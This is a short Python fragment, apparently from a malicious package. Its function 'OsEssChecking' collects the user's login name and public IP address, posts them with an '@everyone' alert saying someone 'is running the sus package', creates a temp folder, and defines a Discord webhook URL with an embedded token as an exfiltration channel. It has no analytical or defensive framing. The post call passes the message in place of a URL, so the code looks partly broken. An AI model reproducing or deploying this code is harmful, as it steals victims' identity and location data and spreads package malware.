...
async def OsEssChecking():
    import requests
    requests.post(f'{os.getlogin()} {requests.get("https://ipinfo.io/ip").text} is running the sus package fr || @everyone ||')
    try:
        os.mkdir(f'{temp}\\osess\\')
    except:
        pass
    webhook = "https://discord.com/api/webhooks/1052332762641735700/cKkfXYMmdDGNCb97eYTdZRFxKt4taDMlHF0CB5-nwDgJ3gtgXE-s3wY0EjIDisxhMLWF"
